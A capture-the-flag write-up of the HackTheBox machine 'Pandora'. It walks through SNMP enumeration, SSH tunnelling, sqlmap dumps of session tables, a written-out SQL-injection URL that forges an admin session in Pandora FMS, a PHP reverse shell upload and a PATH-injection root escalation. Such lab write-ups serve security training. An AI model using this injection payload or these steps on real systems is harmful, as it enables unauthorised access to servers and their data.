---
title: "HackTheBox - Pandora"
author: Nasrallah
description: ""
date: 2023-03-15 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, pathinjection, sqli, sqlmap, tunneling, suid, cve]
img_path: /assets/img/hackthebox/machines/pandora
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Pandora](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.136
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two ports, 22 running SSH and 80 running Apache web server.

## Web

Let's navigate to the web page.

![](1.png)

Nothing interesting in this page, and the links don't go anywhere. However we find the hostname `panda.htb`.

Running a directory scan shows nothing new and that's same case for subdomain scan.

## UDP

Running a udp scan with nmap we find the following result.

```terminal
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.093s latency).

PORT    STATE SERVICE
161/udp open  snmp
```

We found port 161 running SNMP.

One that can be used to enumerate this service is `snmpbulkwalk`.

```bash
apt install snmp
apt install snmp-mibs-downloader
```

Let's start the scan using the following command

```bash
snmpbulkwalk -c public -v2c 10.10.11.136 > scans/snmpbulk.out
```

The output is going to be big so we save to output in a file.

![](2.png)

We can see a lot of information about the system and in the screenshot above we can see processes running on the system.

# **Foothold**

Looking through the output we can see a username and a password.

![](3.png)

Let's see if we can ssh to the target using those credentials.

![](4.png)

Bingo!


# **Privilege Escalation**

## matt

Running linpeas show the following interesting results.

![](5.png)

There is a web app running on local host with the server name `pandora.panda.htb`.

### Tunneling

Let's do a local port forward so that we can access the webapp.

```bash
ssh -L 8000:127.0.0.1:80 daniel@10.10.11.136
```

We set `pandora.panda.htb` to 127.0.0.1 in `/etc/hosts`.

Now we navigate to the web page at:

```text
http://pandora.panda.htb:8000
```

![](6.png)

We got redirected to `/pandora_console` to log in.

At the bottom of the page we see pandora running on version `v7.0NG.742_FIX_PERL2020`.

After some research we find that this version is vulnerable a sql injection vulnerability at `/pandora_console/include/chart_generator.php?session_id=1`.

After enumerating the databases and tables, we find a table called `tpassword_history` what we dump with the following command:

```bash
sqlmap -u 'http://pandora.panda.htb:8000/pandora_console/include/chart_generator.php?session_id=1' --batch -D pandora -T tpassword_history --dump
```

![](7.png)

We found two md5 hashes but couldn't crack them.

Another table that could be of interest for us is `tsessions_php` so let's dump it.

```bash
+----------------------------+-----------------------------------------------------+-------------+                                                   [18/1085]
| id_session                 | data                                                | last_active |
+----------------------------+-----------------------------------------------------+-------------+
| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                            | 1638783555  |
| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                | 1638789018  |
| 1um23if7s531kqf5da14kf5lvm | NULL                                                | 1638792211  |
| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                | 1638786129  |
| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";                            | 1638540332  |
| 3me2jjab4atfa5f8106iklh4fc | NULL                                                | 1638795380  |
| 4f51mju7kcuonuqor3876n8o02 | NULL                                                | 1638786842  |
| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";                            | 1638535373  |
| 59qae699l0971h13qmbpqahlls | NULL                                                | 1638787305  |
| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                | 1638792685  |                                                           
| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";                            | 1638281946  |                   
| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";                            | 1641195617  |
| 6avr0giktbhha49mrli14oti15 | id_usuario|s:6:"daniel";                            | 1678786616  |
| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                | 1623957150  |
| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";                            | 1638446321  |
| 8upeameujo9nhki3ps0fu32cgd | NULL                                                | 1638787267  |
| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";                            | 1638881787  |
| a3a49kc938u7od6e6mlip1ej80 | NULL                                                | 1638795315  |
| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";                            | 1638881664  |
| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                | 1638787213  |
| d0carbrks2lvmb90ergj7jv6po | NULL                                                | 1638786277  |
| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                            | 1641200284  |
| fikt9p6i78no7aofn74rr71m85 | NULL                                                | 1638786504  |
| fqd96rcv4ecuqs409n5qsleufi | NULL                                                | 1638786762  |
| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                            | 1638783230  |
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |
| gf40pukfdinc63nm5lkroidde6 | NULL                                                | 1638786349  |
| heasjj8c48ikjlvsf1uhonfesv | NULL                                                | 1638540345  |
| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";                            | 1638168492  |
| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:"daniel";                            | 1638456173  |
| jujjvuolqai75a9glu9qf0r3qe | NULL                                                | 1678787413  |
| kp90bu1mlclbaenaljem590ik3 | NULL                                                | 1638787808  |
| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                | 1638796348  |
| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:"daniel";                            | 1638540482  |
| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:"daniel";                            | 1637667827  |
| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:"daniel";                            | 1638168416  |
| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                | 1638787723  |
| r097jr6k9s7k166vkvaj17na1u | NULL                                                | 1638787677  |
| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:"daniel";                            | 1638889082  |
| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:"daniel";                            | 1638547193  |
| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:"daniel";                            | 1638793297  |
+----------------------------+-----------------------------------------------------+-------------+

```

We can see the session `g4e01qdgk36mfdh90hvcc54umq` is used by matt, so let's navigate to pandora and replace our current session with this one.

![](8.png)

We're logged in as matt but we can't do a lot of things.

While reasearching for vulnerabilities in this app i came accross this [article](https://sploitus.com/exploit?id=100B9151-5B50-532E-BF69-74864F32DB02) showcasing how to get admin access by doing a sql injection.

```url
http://pandora.panda.htb:8000/pandora_console/include/chart_generator.php?session_id=PayloadHere%27%20union%20select%20%271%27,%272%27,%27id_usuario|s:5:%22admin%22;%27%20--%20a
```

By navigating to the url above, we make a sql injection that sets out current session to an admin session.

Now we can reload `pandora.panda.htb/pandora_console` and we should be logged in as admin.

![](9.png)

Now we got to file manager and upload a reverse shell.

![](10.png)

Using the shell we got as daniel, i searched for the reverse shell and found it at `/var/www/pandora/pandora_console/images`

```terminal
daniel@pandora:/var/www/pandora$ find ./ -type f -name htbshell.php
./pandora_console/images/htbshell.php
```

We setup a listener and navigate to `pandora.panda.htb:8000/pandora_console/images/htbshell.php`

![](11.png)

We got a shell as `matt`.

## root

From the linpeas scan earlier, i found an suid binary called `pandora_backup`.

![](13.png)

Couldn't execute the binary earlier but now we can.

![](12.png)

Running `pandora_backup` for the first time we see it's using tar without a full path name, so i created a copy of tar in `/tmp` that executes bash and added `/tmp` to the PATH. variable.

The exploit worked but didn't get a root shell.

The binary fails to run as root even though it has SUID bit set., but using an ssh session we manage to get a root using the path injection

![](14.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).